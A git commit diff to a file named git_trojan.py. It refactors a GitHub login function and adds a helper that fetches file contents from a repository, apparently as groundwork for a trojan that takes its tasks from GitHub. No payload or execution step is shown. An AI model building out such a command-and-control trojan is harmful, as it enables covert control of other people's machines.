09c54acb9c5448178abc5cdb68c10d4af9b50854
murphy-mtt <zd_wangfenglin@163.com>
2020-06-29 19:37:59 +0800

    Adding gt conn

--- git_trojan.py
+++ git_trojan.py
@@ -30,18 +30,25 @@ configured = False
 task_queue = queue.Queue()
 
 
-def connect_to_github(username, password, repo, branch="master"):
+def connect_to_github(username, password, repository, branch="master"):
     gh = login(username=username, password=password)
-    print(gh)
-    repo = gh.repository(username, repo)
-    print(repo)
+    repo = gh.repository(username, repository)
     branch = repo.branch(branch)
     return gh, repo, branch
+
+
+def get_file_contents(filepath, **kwargs):
+    gh, repo, branch = connect_to_github(kwargs['username'], kwargs['password'], kwargs['repository'])
+    tree = branch.commit.commit.tree.to_tree().recurse()
+    for filename in tree.tree:
+        if filepath in filename.path:
+            print("[*] Found file %s" % filepath)
+            blob = repo.blob(filename._json_data['sha'])
+            return blob.content
+    return None
 
 
 if __name__ == '__main__':
     with open(os.path.join(os.path.expanduser("~"), "online_config/github.json"), 'r') as f:
         account = json.loads(f.read())
-    repo = 'tj'
-    gh = connect_to_github(username=account['username'], password=account['password'], repo=repo)
-    print(gh)
+    r = 'tj'
